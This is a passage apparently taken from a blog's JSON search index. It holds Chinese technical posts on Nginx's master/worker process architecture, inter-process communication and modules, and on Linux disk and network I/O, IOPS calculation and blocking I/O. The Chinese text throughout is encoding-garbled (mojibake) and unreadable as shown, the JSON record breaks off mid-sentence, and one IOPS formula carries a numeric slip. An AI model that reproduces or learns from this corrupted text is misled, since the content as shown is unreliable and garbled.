é‡æ–°é…ç½®å’Œåœ¨çº¿å‡çº§è€Œæ— é¡»ä¸­æ–­å®¢æˆ·çš„å·¥ä½œè¿›ç¨‹ Nginx æ¶æ„å’Œè¿›ç¨‹ Nginx æ¶æ„ Nginx è¿›ç¨‹ç»“æ„ webè¯·æ±‚å¤„ç†æœºåˆ¶\nå¤šè¿›ç¨‹æ–¹å¼ï¼šæœåŠ¡å™¨æ¯æ¥æ”¶åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚å°±æœ‰æœåŠ¡å™¨çš„ä¸»è¿›ç¨‹ç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹å“åº”å®¢æˆ·ç«¯ï¼Œç›´åˆ°ç”¨æˆ·å…³é—­è¿æ¥ï¼Œè¿™æ ·çš„ä¼˜åŠ¿æ˜¯å¤„ç†é€Ÿåº¦å¿«ï¼Œå­è¿›ç¨‹ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä½†æ˜¯å¦‚æœè®¿é—®è¿‡å¤§ä¼šå¯¼è‡´æœåŠ¡å™¨èµ„æºè€—å°½è€Œæ— æ³•æä¾›è¯·æ±‚ã€‚ å¤šçº¿ç¨‹æ–¹å¼ï¼šä¸å¤šè¿›ç¨‹æ–¹å¼ç±»ä¼¼ï¼Œä½†æ˜¯æ¯æ”¶åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ä¼šæœ‰æœåŠ¡è¿›ç¨‹æ´¾ç”Ÿå‡ºä¸€ä¸ªçº¿ç¨‹æ¥ä¸ªå®¢æˆ·æ–¹è¿›è¡Œäº¤äº’ï¼Œä¸€ä¸ªçº¿ç¨‹çš„å¼€é”€è¿œè¿œå°äºä¸€ä¸ªè¿›ç¨‹ï¼Œå› æ­¤å¤šçº¿ç¨‹æ–¹å¼åœ¨å¾ˆå¤§ç¨‹åº¦å‡è½»äº†webæœåŠ¡å™¨å¯¹ç³»ç»Ÿèµ„æºçš„è¦æ±‚ï¼Œä½†æ˜¯å¤šçº¿ç¨‹ä¹Ÿæœ‰è‡ªå·±çš„ç¼ºç‚¹ï¼Œå³å½“å¤šä¸ªçº¿ç¨‹ä½äºåŒä¸€ä¸ªè¿›ç¨‹å†…å·¥ä½œçš„æ—¶å€™ï¼Œå¯ä»¥ç›¸äº’è®¿é—®åŒæ ·çš„å†…å­˜åœ°å€ç©ºé—´ï¼Œæ‰€ä»¥ä»–ä»¬ç›¸äº’å½±å“ï¼Œä¸€æ—¦ä¸»è¿›ç¨‹æŒ‚æ‰åˆ™æ‰€æœ‰å­çº¿ç¨‹éƒ½ä¸èƒ½å·¥ä½œäº†ï¼ŒIISæœåŠ¡å™¨ä½¿ç”¨äº†å¤šçº¿ç¨‹çš„æ–¹å¼ï¼Œéœ€è¦é—´éš”ä¸€æ®µæ—¶é—´å°±é‡å¯ä¸€æ¬¡æ‰èƒ½ç¨³å®šã€‚ Nginxæ˜¯å¤šè¿›ç¨‹ç»„ç»‡æ¨¡å‹ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªç”±Masterä¸»è¿›ç¨‹å’ŒWorkerå·¥ä½œè¿›ç¨‹ç»„æˆã€‚\nä¸»è¿›ç¨‹(master process)çš„åŠŸèƒ½ï¼š\nå¯¹å¤–æ¥å£ï¼šæ¥æ”¶å¤–éƒ¨çš„æ“ä½œï¼ˆä¿¡å·ï¼‰ å¯¹å†…è½¬å‘ï¼šæ ¹æ®å¤–éƒ¨çš„æ“ä½œçš„ä¸åŒï¼Œé€šè¿‡ä¿¡å·ç®¡ç† Worker ç›‘æ§ï¼šç›‘æ§ worker è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼Œworker è¿›ç¨‹å¼‚å¸¸ç»ˆæ­¢åï¼Œè‡ªåŠ¨é‡å¯ worker è¿›ç¨‹ è¯»å–Nginx é…ç½®æ–‡ä»¶å¹¶éªŒè¯å…¶æœ‰æ•ˆæ€§å’Œæ­£ç¡®æ€§ å»ºç«‹ã€ç»‘å®šå’Œå…³é—­socketè¿æ¥ æŒ‰ç…§é…ç½®ç”Ÿæˆã€ç®¡ç†å’Œç»“æŸå·¥ä½œè¿›ç¨‹ æ¥å—å¤–ç•ŒæŒ‡ä»¤ï¼Œæ¯”å¦‚é‡å¯ã€å‡çº§åŠé€€å‡ºæœåŠ¡å™¨ç­‰æŒ‡ä»¤ ä¸ä¸­æ–­æœåŠ¡ï¼Œå®ç°å¹³æ»‘å‡çº§ï¼Œé‡å¯æœåŠ¡å¹¶åº”ç”¨æ–°çš„é…ç½® å¼€å¯æ—¥å¿—æ–‡ä»¶ï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦ ä¸ä¸­æ–­æœåŠ¡ï¼Œå®ç°å¹³æ»‘å‡çº§ï¼Œå‡çº§å¤±è´¥è¿›è¡Œå›æ»šå¤„ç† ç¼–è¯‘å’Œå¤„ç†perlè„šæœ¬ å·¥ä½œè¿›ç¨‹ï¼ˆworker processï¼‰çš„åŠŸèƒ½ï¼š\næ‰€æœ‰ Worker è¿›ç¨‹éƒ½æ˜¯å¹³ç­‰çš„ å®é™…å¤„ç†ï¼šç½‘ç»œè¯·æ±‚ï¼Œç”± Worker è¿›ç¨‹å¤„ç† Workerè¿›ç¨‹æ•°é‡ï¼šä¸€èˆ¬è®¾ç½®ä¸ºæ ¸å¿ƒæ•°ï¼Œå……åˆ†åˆ©ç”¨CPUèµ„æºï¼ŒåŒæ—¶é¿å…è¿›ç¨‹æ•°é‡è¿‡å¤šï¼Œå¯¼è‡´è¿›ç¨‹ç«äº‰CPUèµ„æºï¼Œå¢åŠ ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æŸè€— æ¥å—å¤„ç†å®¢æˆ·çš„è¯·æ±‚, å°†è¯·æ±‚ä¾æ¬¡é€å…¥å„ä¸ªåŠŸèƒ½æ¨¡å—è¿›è¡Œå¤„ç† I/Oè°ƒç”¨ï¼Œè·å–å“åº”æ•°æ® ä¸åç«¯æœåŠ¡å™¨é€šä¿¡ï¼Œæ¥æ”¶åç«¯æœåŠ¡å™¨çš„å¤„ç†ç»“æœ ç¼“å­˜æ•°æ®ï¼Œè®¿é—®ç¼“å­˜ç´¢å¼•ï¼ŒæŸ¥è¯¢å’Œè°ƒç”¨ç¼“å­˜æ•°æ® å‘é€è¯·æ±‚ç»“æœï¼Œå“åº”å®¢æˆ·çš„è¯·æ±‚ æ¥æ”¶ä¸»ç¨‹åºæŒ‡ä»¤ï¼Œæ¯”å¦‚é‡å¯ã€å‡çº§å’Œé€€å‡ºç­‰ Nginx å·¥ä½œæµç¨‹\nNginx è¿›ç¨‹é—´é€šä¿¡ å·¥ä½œè¿›ç¨‹æ˜¯ç”±ä¸»è¿›ç¨‹ç”Ÿæˆçš„ï¼Œä¸»è¿›ç¨‹ä½¿ç”¨fork()å‡½æ•°ï¼Œåœ¨NginxæœåŠ¡å™¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¸»è¿›ç¨‹æ ¹æ®é…ç½®æ–‡ä»¶å†³å®šå¯åŠ¨å·¥ä½œè¿›ç¨‹çš„æ•°é‡ï¼Œç„¶åå»ºç«‹ä¸€å¼ å…¨å±€çš„å·¥ä½œè¡¨ç”¨äºå­˜æ”¾å½“å‰æœªé€€å‡ºçš„æ‰€æœ‰çš„å·¥ä½œè¿›ç¨‹ï¼Œä¸»è¿›ç¨‹ç”Ÿæˆå·¥ä½œè¿›ç¨‹åä¼šå°†æ–°ç”Ÿæˆçš„å·¥ä½œè¿›ç¨‹åŠ å…¥åˆ°å·¥ä½œè¿›ç¨‹è¡¨ä¸­ï¼Œå¹¶å»ºç«‹ä¸€ä¸ªå•å‘çš„ç®¡é“å¹¶å°†å…¶ä¼ é€’ç»™å·¥ä½œè¿›ç¨‹ï¼Œè¯¥ç®¡é“ä¸æ™®é€šçš„ç®¡é“ä¸åŒï¼Œå®ƒæ˜¯ç”±ä¸»è¿›ç¨‹æŒ‡å‘å·¥ä½œè¿›ç¨‹çš„å•å‘é€šé“ï¼ŒåŒ…å«äº†ä¸»è¿›ç¨‹å‘å·¥ä½œè¿›ç¨‹å‘å‡ºçš„æŒ‡ä»¤ã€å·¥ä½œè¿›ç¨‹IDã€å·¥ä½œè¿›ç¨‹åœ¨å·¥ä½œè¿›ç¨‹è¡¨ä¸­çš„ç´¢å¼•å’Œå¿…è¦çš„æ–‡ä»¶æè¿°ç¬¦ç­‰ä¿¡æ¯ã€‚ä¸»è¿›ç¨‹ä¸å¤–ç•Œé€šè¿‡ä¿¡å·æœºåˆ¶è¿›è¡Œé€šä¿¡ï¼Œå½“æ¥æ”¶åˆ°éœ€è¦å¤„ç†çš„ä¿¡å·æ—¶ï¼Œå®ƒé€šè¿‡ç®¡é“å‘ç›¸å…³çš„å·¥ä½œè¿›ç¨‹å‘é€æ­£ç¡®çš„æŒ‡ä»¤ï¼Œæ¯ä¸ªå·¥ä½œè¿›ç¨‹éƒ½æœ‰èƒ½åŠ›æ•è·ç®¡é“ä¸­çš„å¯è¯»äº‹ä»¶ï¼Œå½“ç®¡é“ä¸­æœ‰å¯è¯»äº‹ä»¶çš„æ—¶å€™ï¼Œå·¥ä½œè¿›ç¨‹å°±ä¼šä»ç®¡é“ä¸­è¯»å–å¹¶è§£ææŒ‡ä»¤ï¼Œç„¶åé‡‡å–ç›¸åº”çš„æ‰§è¡ŒåŠ¨ä½œï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸»è¿›ç¨‹ä¸å·¥ä½œè¿›ç¨‹çš„äº¤äº’ã€‚\nworkerè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡åŸç†åŸºæœ¬ä¸Šå’Œä¸»è¿›ç¨‹ä¸workerè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æ˜¯ä¸€æ ·çš„ï¼Œåªè¦workerè¿›ç¨‹ä¹‹é—´èƒ½å¤Ÿå–å¾—å½¼æ­¤çš„ä¿¡æ¯ï¼Œå»ºç«‹ç®¡é“å³å¯é€šä¿¡ï¼Œä½†æ˜¯ç”±äºworkerè¿›ç¨‹ä¹‹é—´æ˜¯å®Œå…¨éš”ç¦»çš„ï¼Œå› æ­¤ä¸€ä¸ªè¿›ç¨‹æƒ³è¦çŸ¥é“å¦å¤–ä¸€ä¸ªè¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯,å°±åªèƒ½é€šè¿‡ä¸»è¿›ç¨‹æ¥å®ç°ã€‚ ä¸ºäº†å®ç°workerè¿›ç¨‹ä¹‹é—´çš„äº¤äº’ï¼Œmasterè¿›ç¨‹åœ¨ç”Ÿæˆworkerè¿›ç¨‹ä¹‹åï¼Œåœ¨workerè¿›ç¨‹è¡¨ä¸­è¿›è¡Œéå†ï¼Œå°†è¯¥æ–°è¿›ç¨‹çš„PIDä»¥åŠé’ˆå¯¹è¯¥è¿›ç¨‹å»ºç«‹çš„ç®¡é“å¥æŸ„ä¼ é€’ç»™workerè¿›ç¨‹ä¸­çš„å…¶ä»–è¿›ç¨‹ï¼Œä¸ºworkerè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡åšå‡†å¤‡ï¼Œå½“workerè¿›ç¨‹1å‘workerè¿›ç¨‹2å‘é€æŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆåœ¨masterè¿›ç¨‹ç»™å®ƒçš„å…¶ä»–workerè¿›ç¨‹å·¥ä½œä¿¡æ¯ä¸­æ‰¾åˆ°2çš„è¿›ç¨‹PIDï¼Œç„¶åå°†æ­£ç¡®çš„æŒ‡ä»¤å†™å…¥æŒ‡å‘è¿›ç¨‹2çš„ç®¡é“ï¼Œworkerè¿›ç¨‹2æ•è·åˆ°ç®¡é“ä¸­çš„äº‹ä»¶åï¼Œè§£ææŒ‡ä»¤å¹¶è¿›è¡Œç›¸å…³æ“ä½œï¼Œè¿™æ ·å°±å®Œæˆäº†workerè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ æ­¤å¤–workerè¿›ç¨‹å¯ä»¥é€šè¿‡å…±äº«å†…å­˜æ¥é€šè®¯ï¼Œæ¯”å¦‚upstreamä¸­çš„zoneï¼Œæˆ–è€…limit_reqã€limit_connä¸­çš„zoneç­‰ã€‚æ“ä½œç³»ç»Ÿæä¾›äº†å…±äº«å†…å­˜æœºåˆ¶ã€‚ Nginx å¯åŠ¨å’ŒHTTPè¿æ¥å»ºç«‹ Nginx å¯åŠ¨æ—¶ï¼ŒMaster è¿›ç¨‹ï¼ŒåŠ è½½é…ç½®æ–‡ä»¶ Master è¿›ç¨‹ï¼Œåˆå§‹åŒ–ç›‘å¬çš„ socket Master è¿›ç¨‹ï¼Œfork å‡ºå¤šä¸ª Worker è¿›ç¨‹ Worker è¿›ç¨‹ï¼Œç«äº‰æ–°çš„è¿æ¥ï¼Œè·èƒœæ–¹é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹ Socket è¿æ¥ï¼Œå¹¶å¤„ç†è¯·æ±‚ HTTP è¯·æ±‚å¤„ç†æµç¨‹ Nginx æ¨¡å—ä»‹ç» nginx æœ‰å¤šç§æ¨¡å—\næ ¸å¿ƒæ¨¡å—ï¼šæ˜¯ Nginx æœåŠ¡å™¨æ­£å¸¸è¿è¡Œå¿…ä¸å¯å°‘çš„æ¨¡å—ï¼Œæä¾›é”™è¯¯æ—¥å¿—è®°å½• ã€é…ç½®æ–‡ä»¶è§£æ ã€äº‹ä»¶\né©±åŠ¨æœºåˆ¶ ã€è¿›ç¨‹ç®¡ç†ç­‰æ ¸å¿ƒåŠŸèƒ½\næ ‡å‡†HTTPæ¨¡å—ï¼šæä¾› HTTP åè®®è§£æç›¸å…³çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š ç«¯å£é…ç½® ã€ ç½‘é¡µç¼–ç è®¾ç½® ã€ HTTPå“åº”\nå¤´è®¾ç½® ç­‰ç­‰\nå¯é€‰HTTPæ¨¡å—ï¼šä¸»è¦ç”¨äºæ‰©å±•æ ‡å‡†çš„ HTTP åŠŸèƒ½ï¼Œè®© Nginx èƒ½å¤„ç†ä¸€äº›ç‰¹æ®Šçš„æœåŠ¡ï¼Œæ¯”å¦‚ï¼š Flash\nå¤šåª’ä½“ä¼ è¾“ ã€è§£æ GeoIP è¯·æ±‚ã€ ç½‘ç»œä¼ è¾“å‹ç¼© ã€ å®‰å…¨åè®® SSL æ”¯æŒç­‰\né‚®ä»¶æœåŠ¡æ¨¡å—ï¼šä¸»è¦ç”¨äºæ”¯æŒ Nginx çš„ é‚®ä»¶æœåŠ¡ ï¼ŒåŒ…æ‹¬å¯¹ POP3 åè®®ã€ IMAP åè®®å’Œ SMTPåè®®\nçš„æ”¯æŒ\nStreamæœåŠ¡æ¨¡å—: å®ç°åå‘ä»£ç†åŠŸèƒ½,åŒ…æ‹¬TCPåè®®ä»£ç†\nç¬¬ä¸‰æ–¹æ¨¡å—ï¼šæ˜¯ä¸ºäº†æ‰©å±• Nginx æœåŠ¡å™¨åº”ç”¨ï¼Œå®Œæˆå¼€å‘è€…è‡ªå®šä¹‰åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š Json æ”¯æŒã€ Lua æ”¯\næŒç­‰\nnginxé«˜åº¦æ¨¡å—åŒ–ï¼Œä½†å…¶æ¨¡å—æ—©æœŸä¸æ”¯æŒDSOæœºåˆ¶;1.9.11 ç‰ˆæœ¬æ”¯æŒåŠ¨æ€è£…è½½å’Œå¸è½½\næ¨¡å—åˆ†ç±»ï¼š\næ ¸å¿ƒæ¨¡å—ï¼šcore module æ ‡å‡†æ¨¡å—ï¼š HTTP æ¨¡å—ï¼šngx_http_* HTTP Core modules #é»˜è®¤åŠŸèƒ½ HTTP Optional modules #éœ€ç¼–è¯‘æ—¶æŒ‡å®š Mail æ¨¡å—: ngx_mail_* Stream æ¨¡å— ngx_stream_* ç¬¬ä¸‰æ–¹æ¨¡å— ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/","summary":"\u003cp\u003eNginxåŸºç¡€æ¶æ„å’ŒåŠŸèƒ½ç®€ä»‹\u003c/p\u003e","title":"Nginxæ¶æ„ç®€ä»‹"},{"content":"æœ¬èŠ‚å†…å®¹ä¸»è¦ç”¨äºç†è§£Linuxçš„I/Oæ¨¡å‹ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£Nginxæ¶æ„ã€‚\nI/Oçš„å®šä¹‰ I/Oåœ¨è®¡ç®—æœºä¸­æŒ‡Input/Outputï¼Œ IOPS (Input/Output Per Second)å³æ¯ç§’çš„è¾“å…¥è¾“å‡ºé‡(æˆ–è¯»å†™æ¬¡æ•°)ï¼Œæ˜¯è¡¡é‡ç£ç›˜æ€§èƒ½çš„ä¸»è¦æŒ‡æ ‡ä¹‹ä¸€ã€‚IOPSæ˜¯æŒ‡å•ä½æ—¶é—´å†…ç³»ç»Ÿèƒ½å¤„ç†çš„I/Oè¯·æ±‚æ•°é‡ï¼Œä¸€èˆ¬ä»¥æ¯ç§’å¤„ç†çš„I/Oè¯·æ±‚æ•°é‡ä¸ºå•ä½ï¼ŒI/Oè¯·æ±‚é€šå¸¸ä¸ºè¯»æˆ–å†™æ•°æ®æ“ä½œè¯·æ±‚ã€‚\nä¸€æ¬¡å®Œæ•´çš„I/Oæ˜¯ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹æ•°æ®ä¸å†…æ ¸ç©ºé—´çš„å†…æ ¸æ•°æ®çš„æŠ¥æ–‡çš„å®Œæ•´äº¤æ¢ï¼Œä½†æ˜¯ç”±äºå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´æ˜¯ä¸¥æ ¼éš”ç¦»çš„ï¼Œæ‰€ä»¥å…¶æ•°æ®äº¤æ¢è¿‡ç¨‹ä¸­ä¸èƒ½ç”±ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ç›´æ¥è°ƒç”¨å†…æ ¸ç©ºé—´çš„å†…å­˜æ•°æ®ï¼Œè€Œæ˜¯éœ€è¦ç»å†ä¸€æ¬¡ä»å†…æ ¸ç©ºé—´ä¸­çš„å†…å­˜æ•°æ®copyåˆ°ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹å†…å­˜å½“ä¸­ï¼Œæ‰€ä»¥ç®€å•è¯´I/Oå°±æ˜¯æŠŠæ•°æ®ä»å†…æ ¸ç©ºé—´ä¸­çš„å†…å­˜æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ä¸­è¿›ç¨‹çš„å†…å­˜å½“ä¸­ã€‚\nLinux çš„ I/O ç£ç›˜I/O ç½‘ç»œI/O : ä¸€åˆ‡çš†æ–‡ä»¶,æœ¬è´¨ä¸ºå¯¹socketæ–‡ä»¶çš„è¯»å†™ ç£ç›˜ I/O ç£ç›˜I/Oæ˜¯è¿›ç¨‹å‘å†…æ ¸å‘èµ·ç³»ç»Ÿè°ƒç”¨ï¼Œè¯·æ±‚ç£ç›˜ä¸Šçš„æŸä¸ªèµ„æºæ¯”å¦‚æ˜¯html æ–‡ä»¶æˆ–è€…å›¾ç‰‡ï¼Œç„¶åå†…æ ¸é€šè¿‡ç›¸åº”çš„é©±åŠ¨ç¨‹åºå°†ç›®æ ‡æ–‡ä»¶åŠ è½½åˆ°å†…æ ¸çš„å†…å­˜ç©ºé—´ï¼ŒåŠ è½½å®Œæˆä¹‹åæŠŠæ•°æ®ä»å†…æ ¸å†…å­˜ï¼ˆå†…æ ¸ç©ºé—´ï¼‰å†å¤åˆ¶ç»™è¿›ç¨‹å†…å­˜ï¼ˆç”¨æˆ·ç©ºé—´ï¼‰ï¼Œå¦‚æœæ˜¯æ¯”è¾ƒå¤§çš„æ•°æ®ä¹Ÿéœ€è¦ç­‰å¾…ä¸€å®šæ—¶é—´ã€‚\næœºæ¢°ç£ç›˜çš„å¯»é“æ—¶é—´ã€æ—‹è½¬å»¶è¿Ÿå’Œæ•°æ®ä¼ è¾“æ—¶é—´ï¼š å¯»é“æ—¶é—´ï¼šæ˜¯æŒ‡ç£å¤´ç§»åŠ¨åˆ°æ­£ç¡®çš„ç£é“ä¸Šæ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå¯»é“æ—¶é—´è¶ŠçŸ­åˆ™I/Oå¤„ç†å°±è¶Šå¿«ï¼Œç›®å‰ç£ç›˜çš„å¯»é“æ—¶é—´ä¸€èˆ¬åœ¨3-15æ¯«ç§’å·¦ å³ã€‚ æ—‹è½¬å»¶è¿Ÿï¼šæ˜¯æŒ‡å°†ç£ç›˜ç‰‡æ—‹è½¬åˆ°æ•°æ®æ‰€åœ¨çš„æ‰‡åŒºåˆ°ç£å¤´ä¸‹é¢æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œæ—‹è½¬å»¶è¿Ÿå–å†³äºç£ç›˜çš„è½¬é€Ÿï¼Œé€šå¸¸ä½¿ç”¨ç£ç›˜æ—‹è½¬ä¸€å‘¨æ‰€ éœ€è¦æ—¶é—´çš„1/2ä¹‹ä¸€è¡¨ç¤ºï¼Œæ¯”å¦‚7200è½¬çš„ç£ç›˜å¹³å‡è®­ä¼ å»¶è¿Ÿå¤§çº¦ä¸º60*1000/7200/2=4.17æ¯«ç§’ï¼Œå…¬å¼çš„æ„æ€ä¸º ï¼ˆæ¯åˆ†é’Ÿ60ç§’*1000æ¯«ç§’æ¯ç§’/7200è½¬æ¯åˆ†/2ï¼‰ï¼Œå¦‚æœæ˜¯15000è½¬çš„åˆ™ä¸º60*1000/15000/2=2æ¯«ç§’ã€‚ æ•°æ®ä¼ è¾“æ—¶é—´ï¼šæŒ‡çš„æ˜¯è¯»å–åˆ°æ•°æ®åä¼ è¾“æ•°æ®çš„æ—¶é—´ï¼Œä¸»è¦å–å†³äºä¼ è¾“é€Ÿç‡ï¼Œè¿™ä¸ªå€¼ç­‰äºæ•°æ®å¤§å°é™¤ä»¥ä¼ è¾“é€Ÿç‡ï¼Œç›®å‰çš„ç£ç›˜æ¥å£ æ¯ç§’çš„ä¼ è¾“é€Ÿåº¦å¯ä»¥è¾¾åˆ°600MBï¼Œå› æ­¤å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚ å¸¸è§çš„æœºæ¢°ç£ç›˜å¹³å‡å¯»é“æ—¶é—´å€¼ï¼š 7200è½¬/åˆ†çš„ç£ç›˜å¹³å‡ç‰©ç†å¯»é“æ—¶é—´ï¼š9æ¯«ç§’ 10000è½¬/åˆ†çš„ç£ç›˜å¹³å‡ç‰©ç†å¯»é“æ—¶é—´ï¼š6æ¯«ç§’ 15000è½¬/åˆ†çš„ç£ç›˜å¹³å‡ç‰©ç†å¯»é“æ—¶é—´ï¼š4æ¯«ç§’ å¸¸è§ç£ç›˜çš„å¹³å‡å»¶è¿Ÿæ—¶é—´ï¼š 7200è½¬çš„æœºæ¢°ç›˜å¹³å‡å»¶è¿Ÿï¼š60*1000/7200/2 = 4.17ms 10000è½¬çš„æœºæ¢°ç›˜å¹³å‡å»¶è¿Ÿï¼š60*1000/10000/2 = 3ms 15000è½¬çš„æœºæ¢°ç›˜å¹³å‡å»¶è¿Ÿï¼š60*1000/15000/2 = 2ms æ¯ç§’æœ€å¤§IOPSçš„è®¡ç®—æ–¹æ³•ï¼š 7200è½¬çš„ç£ç›˜IOPSè®¡ç®—æ–¹å¼ï¼š1000æ¯«ç§’/(9æ¯«ç§’çš„å¯»é“æ—¶é—´+4.17æ¯«ç§’çš„å¹³å‡æ—‹è½¬å»¶è¿Ÿæ—¶é—´)=1000/13.13=75.9 IOPS 10000è½¬çš„ç£ç›˜çš„IOPSè®¡ç®—æ–¹å¼ï¼š1000æ¯«ç§’/(6æ¯«ç§’çš„å¯»é“æ—¶é—´+3æ¯«ç§’çš„å¹³å‡æ—‹è½¬å»¶è¿Ÿæ—¶é—´)=1000/9=111IOPS 15000è½¬çš„ç£ç›˜çš„IOPSè®¡ç®—æ–¹å¼ï¼š15000æ¯«ç§’/(4æ¯«ç§’çš„å¯»é“æ—¶é—´+2æ¯«ç§’çš„å¹³å‡æ—‹è½¬å»¶è¿Ÿæ—¶é—´)=1000/6=166.6 IOPS ç½‘ç»œ I/O ç½‘ç»œåè®®æ ˆåˆ°ç”¨æˆ·ç©ºé—´è¿›ç¨‹çš„IOå°±æ˜¯ç½‘ç»œIO\nç½‘ç»œI/Oå¤„ç†è¿‡ç¨‹\nè·å–è¯·æ±‚æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥å‘å‡ºè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥å—è¯·æ±‚ï¼ˆ1-3ï¼‰ æ„å»ºå“åº”ï¼Œå½“æœåŠ¡å™¨æ¥æ”¶å®Œè¯·æ±‚ï¼Œå¹¶åœ¨ç”¨æˆ·ç©ºé—´å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç›´åˆ°æ„å»ºå“åº”å®Œæˆï¼ˆ4ï¼‰ è¿”å›æ•°æ®ï¼ŒæœåŠ¡å™¨å°†å·²æ„å»ºå¥½çš„å“åº”å†é€šè¿‡å†…æ ¸ç©ºé—´çš„ç½‘ç»œ I/O è¿”å›ç»™å®¢æˆ·ç«¯ï¼ˆ5-7ï¼‰ æ¯æ¬¡I/Oéƒ½è¦ç»å†çš„ä¸¤ä¸ªé˜¶æ®µ\nç¬¬ä¸€æ­¥ï¼šå°†æ•°æ®ä»æ–‡ä»¶å…ˆåŠ è½½è‡³å†…æ ¸å†…å­˜ç©ºé—´ï¼ˆç¼“å†²åŒºï¼‰ï¼Œç­‰å¾…æ•°æ®å‡†å¤‡å®Œæˆï¼Œæ—¶é—´è¾ƒé•¿ï¼ˆç½‘ç»œæ•°æ®æ‹·è´ï¼‰ ç¬¬äºŒæ­¥ï¼šå°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹çš„å†…å­˜ä¸­ï¼Œæ—¶é—´è¾ƒçŸ­ï¼ˆå†…å­˜æ•°æ®æ‹·è´ï¼‰ I/O æ¨¡å‹ I/Oæ¨¡å‹ç›¸å…³æ¦‚å¿µ åŒæ­¥/å¼‚æ­¥ï¼šå…³æ³¨çš„æ˜¯æ¶ˆæ¯é€šä¿¡æœºåˆ¶ï¼Œå³è°ƒç”¨è€…åœ¨ç­‰å¾…ä¸€ä»¶äº‹æƒ…çš„å¤„ç†ç»“æœæ—¶ï¼Œè¢«è°ƒç”¨è€…æ˜¯å¦æä¾›å®ŒæˆçŠ¶æ€çš„é€šçŸ¥ã€‚\nåŒæ­¥ï¼šsynchronousï¼Œè¢«è°ƒç”¨è€…å¹¶ä¸æä¾›äº‹ä»¶çš„å¤„ç†ç»“æœç›¸å…³çš„é€šçŸ¥æ¶ˆæ¯ï¼Œéœ€è¦è°ƒç”¨è€…ä¸»åŠ¨è¯¢é—®äº‹æƒ…æ˜¯å¦å¤„ç†å®Œæˆ å¼‚æ­¥ï¼šasynchronousï¼Œè¢«è°ƒç”¨è€…é€šè¿‡çŠ¶æ€ã€é€šçŸ¥æˆ–å›è°ƒæœºåˆ¶ä¸»åŠ¨é€šçŸ¥è°ƒç”¨è€…è¢«è°ƒç”¨è€…çš„è¿è¡ŒçŠ¶æ€ é˜»å¡/éé˜»å¡ï¼šå…³æ³¨è°ƒç”¨è€…åœ¨ç­‰å¾…ç»“æœè¿”å›ä¹‹å‰æ‰€å¤„çš„çŠ¶æ€\né˜»å¡ï¼šblockingï¼ŒæŒ‡IOæ“ä½œéœ€è¦å½»åº•å®Œæˆåæ‰è¿”å›åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè°ƒç”¨ç»“æœè¿”å›ä¹‹å‰ï¼Œè°ƒç”¨è€…è¢«æŒ‚èµ·ï¼Œå¹²ä¸äº†åˆ«çš„äº‹æƒ…ã€‚ éé˜»å¡ï¼šnonblockingï¼ŒæŒ‡IOæ“ä½œè¢«è°ƒç”¨åç«‹å³è¿”å›ç»™ç”¨æˆ·ä¸€ä¸ªçŠ¶æ€å€¼ï¼Œè€Œæ— éœ€ç­‰åˆ°IOæ“ä½œå½»åº•å®Œæˆï¼Œåœ¨æœ€ç»ˆçš„è°ƒç”¨ç»“æœè¿”å›ä¹‹å‰ï¼Œè°ƒç”¨è€…ä¸ä¼šè¢«æŒ‚èµ·ï¼Œå¯ä»¥å»åšåˆ«çš„äº‹æƒ…ã€‚ ç½‘ç»œ I/O æ¨¡å‹ é˜»å¡å‹ã€éé˜»å¡å‹ã€å¤ç”¨å‹ã€ä¿¡å·é©±åŠ¨å‹ã€å¼‚æ­¥\né˜»å¡å‹ I/O æ¨¡å‹ï¼ˆblocking IOï¼‰ é˜»å¡IOæ¨¡å‹æ˜¯æœ€ç®€å•çš„I/Oæ¨¡å‹ï¼Œç”¨æˆ·çº¿ç¨‹åœ¨å†…æ ¸è¿›è¡ŒIOæ“ä½œæ—¶è¢«é˜»å¡ã€‚\nç”¨æˆ·çº¿ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨readå‘èµ·I/Oè¯»æ“ä½œï¼Œç”±ç”¨æˆ·ç©ºé—´è½¬åˆ°å†…æ ¸ç©ºé—´ã€‚å†…æ 